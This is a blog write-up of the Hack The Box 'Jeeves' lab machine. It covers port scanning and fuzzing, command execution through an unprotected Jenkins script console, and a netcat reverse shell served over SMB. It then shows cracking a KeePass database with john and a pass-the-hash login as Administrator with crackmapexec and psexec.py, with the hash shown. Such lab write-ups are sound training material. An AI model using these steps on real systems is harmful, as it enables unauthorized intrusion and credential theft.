@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Jeeves - Write up :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Jeeves - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/jeeves/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Jeeves - Write up">
+<meta property="og:description" content="**HTB | Jeeves - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/jeeves/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Jeeves.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-06 18:45:24 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/jeeves/">Jeeves - Write up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-06
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ejpt-like/">eJPT-like</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/htb/">HTB</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/windows/">windows</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/jenkins/">jenkins</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/keepass/">keepass</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/alternate_data_streams/">alternate_data_streams</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Jeeves.png"
+    class="post-cover"
+    alt="Jeeves - Write up"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Jeeves</strong> is an old <strong>Hack The Box</strong> machine that introduced some interesting techniques and topics.</p>
+<p>We will start by finding a <strong>Jenkins</strong> instance that we will get command execution from.</p>
+<p>Moving on to cracking a <strong>KeePass</strong> database and pull out a hash that we are going to use to get a shell as Administrator.</p>
+<p>And finally finding the <strong>root.txt</strong> that&rsquo;s hidden in an alternate data stream.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With <strong>nmap</strong> we will do a recon through the ports of the victim machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> -v -n -Pn 10.129.1.109 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-06 18:57 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 18:57
+</span></span><span style="display:flex;"><span>Scanning 10.129.1.109 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.1.109
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.129.1.109
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.129.1.109
+</span></span><span style="display:flex;"><span>Discovered open port 50000/tcp on 10.129.1.109
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 18:57, 26.45s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.1.109
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>50000/tcp open  ibm-db2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.60 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131083</span> <span style="color:#f92672">(</span>5.768MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">20</span> <span style="color:#f92672">(</span>880B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We are exporting the result in grepable format to <strong>allPorts</strong>, which is great to manage with regex and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.1.109
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 80,135,445,50000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>We see some web related ports that we can examinate now:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p80,135,445,50000 10.129.1.109 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-06 19:02 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.1.109
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Ask Jeeves
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+</span></span><span style="display:flex;"><span>|_http-title: Error <span style="color:#ae81ff">404</span> Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>9.4.z-SNAPSHOT<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2022-07-07T05:02:42
+</span></span><span style="display:flex;"><span>|_  start_date: 2022-07-07T03:56:53
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m57s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 48.56 seconds
+</span></span></code></pre></div><p>There are a couple web services.</p>
+<ul>
+<li>Port 80
+
+  <img src="/img/jev1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</li>
+</ul>
+<p>It looks like a search engine but when we input anything it directs us to an <strong>error.html</strong>:
+
+  <img src="/img/jev2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>So we are going to leave this aside for the moment.</p>
+<ul>
+<li>Port 5000
+
+  <img src="/img/jev3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</li>
+</ul>
+<p>Both of them look very static so we are going to do some <strong>fuzzing</strong> with <strong>wfuzz</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.1.109:50000/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.129.1.109:50000/FUZZ
+</span></span><span style="display:flex;"><span>Total requests: 220547
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000041594:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;askjeeves&#34;</span>
+</span></span></code></pre></div><p>Using a dictionary from <strong>Seclists</strong> and working with 200 threads we find <strong>/askjeeves</strong>:</p>
+
+  <img src="/img/jev4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="foothold"><strong><code>Foothold</code></strong><a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This looks like an outdated <strong>Jenkins</strong> instance, however we have access to the main panel, and if it&rsquo;s not configured properly we could get command execution.</p>
+<p>Firts we go to <strong>&gt; Manage Jenkins</strong>:
+
+  <img src="/img/jev6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>Indeed we have access to the critical part, the <strong>Script console</strong>:
+
+  <img src="/img/jev5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>This will execute code in <strong>Groovy</strong>, which has a way to execute system commands:
+
+  <img src="/img/jev7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>We can give this a try:
+
+  <img src="/img/jev8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>And it works!</p>
+<p>Now we can get a reverse shell with ease.</p>
+<p>First we are going to start by sharing a <strong>netcat</strong> with a <strong>smb server</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ls
+</span></span><span style="display:flex;"><span> nc.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ smbserver.py smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>We are creating a folder named <strong>smbFolder</strong> synchronized with our current working folder.</p>
+<p>Now we set a listener and execute it from the website:
+
+  <img src="/img/jev9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>We are using twice the amount of <strong>\</strong> because of the syntax of the language.</p>
+<p>Now we should get the connection to our netcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ rlwrap nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.1.109.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.1.109:49678.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.10586<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\.</span>jenkins&gt;
+</span></span></code></pre></div><p>I&rsquo;m using <strong>rlwrap</strong> with the netcat so I can do things like ^L and using the arrow keys to navigate through the commands I&rsquo;ve used.</p>
+<p>Once inside we can find the <strong>user.txt</strong> in our user&rsquo;s Desktop:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Directory of C:sers<span style="color:#ae81ff">\k</span>ohsuke<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>11/03/2017  11:19 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>11/03/2017  11:19 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>11/03/2017  11:22 PM                <span style="color:#ae81ff">32</span> user.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">32</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   7,245,778,944 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>type user.txt
+</span></span><span style="display:flex;"><span>e3232272596fb47950d*************
+</span></span></code></pre></div><p>Now we can start enumerating the system.</p>
+<p>Inside the Documents folder we find a <strong>KeePass database</strong> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is BE50-B1C9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:sers<span style="color:#ae81ff">\k</span>ohsuke<span style="color:#ae81ff">\D</span>ocuments
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>11/03/2017  11:18 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>11/03/2017  11:18 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>09/18/2017  01:43 PM             2,846 CEH.kdbx
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>          2,846 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   7,246,278,656 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\k</span>ohsuke<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>We are going to send this over with the <strong>smbserver</strong> we have set:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ copy CEH.kdbx <span style="color:#ae81ff">\\</span>10.10.14.161<span style="color:#ae81ff">\s</span>mbFolder<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ls
+</span></span><span style="display:flex;"><span> CEH.kdbx nc.exe 
+</span></span></code></pre></div><p>With <strong>keepassxc</strong> we can open this database, however we need the master password:
+
+  <img src="/img/jev10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>Using <strong>keepass2john</strong> we will get a hash that we can crack to get this password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ keepass2john CEH.kdbx &gt; hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ john --wordlist<span style="color:#f92672">=</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>KeePass <span style="color:#f92672">[</span>SHA256 AES 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">6000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>version<span style="color:#f92672">)</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>algorithm <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>AES 1<span style="color:#f92672">=</span>TwoFish 2<span style="color:#f92672">=</span>ChaCha<span style="color:#f92672">])</span> is <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">2</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>moonshine1       <span style="color:#f92672">(</span>CEH<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1g 0:00:00:50 DONE <span style="color:#f92672">(</span>2022-07-06 20:10<span style="color:#f92672">)</span> 0.01979g/s 1088p/s 1088c/s 1088C/s nana09..monyong
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Luckily for us the password is inside <strong>rockyou.txt</strong>, now we can take a look into the <strong>keepass</strong>:
+
+  <img src="/img/jev11.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>We have a lot of data so let&rsquo;s go one by one.</p>
+<p>In the <em>Backup stuff</em> we find what it looks like a Windows hash:
+
+  <img src="/img/jev12.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>These hashes have the format <code>LM Hash:NT Hash</code>. The LM part is not very useful, but with the NT hash we could do a <strong>Pass-The-Hash Attack</strong>.</p>
+<p>If the machine is vulnerable we can use this hash as an authentication without the need of the password in clear text.</p>
+<p>We can validate this with <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ crackmapexec smb 10.129.1.109 -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -H <span style="color:#e6db74">&#39;e0fb1fb85756c24235ff238cbe81fe00&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.129.1.109    <span style="color:#ae81ff">445</span>    JEEVES           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">10586</span> x64 <span style="color:#f92672">(</span>name:JEEVES<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Jeeves<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.1.109    <span style="color:#ae81ff">445</span>    JEEVES           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Jeeves<span style="color:#ae81ff">\A</span>dministrator:e0fb1fb85756c24235ff238cbe81fe00 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We get <em>(Pwn3d!)</em> which means we can use <strong>psexec.py</strong> to get a shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ psexec.py WORKGROUP/Administrator@10.129.1.109 -hashes :e0fb1fb85756c24235ff238cbe81fe00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.129.1.109.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file GgZgSVVm.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.129.1.109.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service BeDP on 10.129.1.109.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service BeDP.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.10586<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>We are inside as a privileged user but the job is not finished.
